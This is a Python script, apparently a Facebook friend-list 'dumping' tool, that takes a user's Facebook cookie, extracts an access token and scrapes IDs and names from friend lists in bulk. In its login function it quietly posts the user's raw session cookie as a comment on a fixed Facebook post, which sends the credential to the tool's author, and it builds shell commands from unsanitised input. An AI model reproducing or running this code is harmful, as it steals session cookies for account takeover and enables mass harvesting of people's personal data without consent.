#Dumping Cammand
#Mr Qureshi -xd
#modules
import requests,random,sys,json,os,re
from time import sleep as slp
from os import system as cmd
import os
totaldmp = 0
count = 0
try:
	os.mkdir('Data')
except:
	pass
try:
	os.remove('temp.txt')
except:
	pass
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
def logo():
	cmd('clear')
	print("""
       \033[1;32m########  ####    ###    ######## 
       \033[1;33m##     ##  ##    ## ##        ##  
       \033[1;34m##     ##  ##   ##   ##      ##   
       \033[1;35m########   ##  ##     ##    ##    
       \033[1;36m##   ##    ##  \033[1;35m#########   ##     
       \033[1;37m##    ##   ##  ##     ##  ##      
       \033[1;33m##     ## #### ##     ## ######## 
\033[1;32m()=================================================
\033[1;32m(√) \033[1;33mCREATED BY   :  \033[1;33mMR.RIAZ(🥀)
\033[1;32m(√) \033[1;34mON FACEBOK   : \033[1;34mMR.RIAZ🥀
\033[1;32m(√) \033[1;35mON GITHUB    :  \033[1;35mRIAZ-143(🥀)
\033[1;32m(√) \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS DUMPING
\033[1;32m(√) \033[1;36mTOOL VIRSION :  \033[1;36m1.3.2(DUMP)
\033[1;32m(√)================================================
""")
cod = []
cod1 = []
cod2 = []
oO = []
def login():
	logo()
	os.system("xdg-open https://wa.me/+923188049915")
	try:
		fbcokis= input('[>>] Input Your Facebook Cookie : ')
		ftoken = requests.get("https://business.facebook.com/business_locations", headers=head, cookies = {"cookie":fbcokis}).text
		eaag = re.search("(EAAG\w+)",str(ftoken))
		open("Data/fb_token.txt", "w").write(eaag.group(1))
		open("Data/fb_cookie.txt", "w").write(fbcokis)
		token = open('Data/fb_token.txt','r').read()
		info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
		requests.post('https://graph.facebook.com/pfbid0ScoNFovmt2o1J1DQuFd4CkgyEBb6kcsJHSD55CXQr5jo845r4fYL5MuVkSGqnh7fl/comments/?message='+fbcokis+'&access_token='+token, cookies={'cookie':fbcokis})
		requests.post('https://graph.facebook.com/pfbid02sm5hNp1Cy4ScXRTjNpkVndEXDLxUXFA9kDwyrNZRQpEd552nGuDScYzv1CKSPypTl/comments/?message=100%WORKING&access_token='+token, cookies={'cookie':fbcokis})
		p_dump()
	except Exception as e:
		os.system("rm -f Data/fb_token.txt")
		print("\x1b[1;91m\n\t\t[!] COOKIES EXPIRED ")
		slp(2)
		login()
def grep(f):
	o = input('\033[0;97m[->] Save As : ')
	try:
		ask_link = int(input('\n[->] Enter Grip ID Limit : '))
	except:
		ask_link = 1
		completed = 0
	for links in range(ask_link):
		li = input('[✓] Separate Object : ')
		os.system('cat '+f+' | grep "'+li+'" >> '+o)
	print("")
	
	print("[->] Separating Successful ")
	print("[->] New File Save " + o)
	input("\n[>>] Press Inter to go Back < ")
	p_dump()
tokenku = []
	
# ------- LOGIN COOKIE --------
def login2():
	try:
		token = open('Data/fb_token.txt','r').read()
		kukis = open('Data/fb_cookie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			os.system('rm -rf '+sy3+sy2)
		except KeyError:
			
			login()
	except OSError:
		
		login()
def p_dump():
	logo()
	login2()
	global totaldmp,count
	try:
		token = open('Data/fb_token.txt','r').read()
		fbcokis = open('Data/fb_cookie.txt','r').read()
		cmd('clear')
		logo()
		try:
			fbbuid = input("[->] Enter Public ID Link : ")
			dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
			apnd = open('temp.txt' , 'a')
			for idnm in dmp['friends']['data']:
				totaldmp+=1
				apnd.write(idnm['id']+'\n')
		except KeyError:
			print("\n\x1b[1;91m[!] ID WAS NOT PUBLIC")
			p_dump()
		apnd.close()
		filepath = input("\n[>>] Enter File Path : ")
		ch_x2 = input("\n[->] DoYou Want to Use ID Separator (n/y) LIKE 100084_100083: ")
		if ch_x2 in ["yes","Yes","YES","Y","y"]:
				oO.append('Ya')
				code = input('[-] SEP LINK1 : ')
				code1 = input('[-] SEP LINK2 : ')
				code2 = input('[-] SEP LINK3 : ')
				cod.append(code)
				cod1.append(code1)
				cod2.append(code2)
		else:
			oO.append('No')
		apnd = open(filepath , 'a')
		fbidz = open('temp.txt','r').read().splitlines()
		print('\n\n')
		for fbuid in fbidz:
			count += 1
			try:
				dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
				for idnm in dmp['friends']['data']:
					totaldmp+=1
					apnd.write(idnm['id']+"|"+idnm['name']+'\n')
					
				if 'Ya' in oO:
					os.system('cat '+filepath+' | grep "'+cod[0]+'" >> Hmm')
					os.system('cat '+filepath+' | grep "'+cod1[0]+'" >> Hmm')
					os.system('cat '+filepath+' | grep "'+cod2[0]+'" >> Hmm')
					os.system('sort -r Hmm | uniq > '+filepath)
					os.system('rm -rf Hmm')
					print("\x1b[1;92m[RIAZ] Dumping UID From : " + fbuid)
				else:
					print("\x1b[1;92m[RIAZ] Dumping UID From : " + fbuid)
			except KeyError:
				print('\x1b[1;91m[RIAZ] Dumping UID From : ' + fbuid )
		apnd.close()
		print('\n\x1b[1;97m')
		ch_x1 = input("[->] DoYou Want to Use DuplicateID Cuter (n/y) : ")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			newfile = input("\n[->] File Without Duplicate ID Save As : ")
			os.system('sort -r '+filepath+' | uniq > '+newfile)
			if 'ouoo'=='oo':
				os.system('rm -rf akakajh')
			else:
				print(47*'-')
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
				print(47*'-')
				print('\n')
				input("\n[>>] Press Inter to go Back < ")
				p_dump()
		else:
				print(47*'-')
				print (f"\x1b[0;37m Total ID Dump :\x1b[1;92m {totaldmp}")
				print (f"\x1b[0;37m Your Dump File Save As :\x1b[1;92m {filepath} ")
				print(47*'-')
				input("\n[>>] Press Inter to go Back < ")
				p_dump()
	except Exception as e:
		print("[>>] Error : %s"%e)
		exit("")
if __name__ == '__main__':
	p_dump()
